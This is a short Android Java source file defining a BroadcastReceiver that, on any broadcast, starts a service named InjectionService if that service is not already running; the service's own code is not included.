package com.secure;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created by matthewdyer on 23/05/15.
 */
public class Receiver extends android.content.BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent newService = new Intent(context,InjectionService.class);
        if (!InjectionService.serviceIsRunning) {
            context.startService(newService);
        }
    }
}
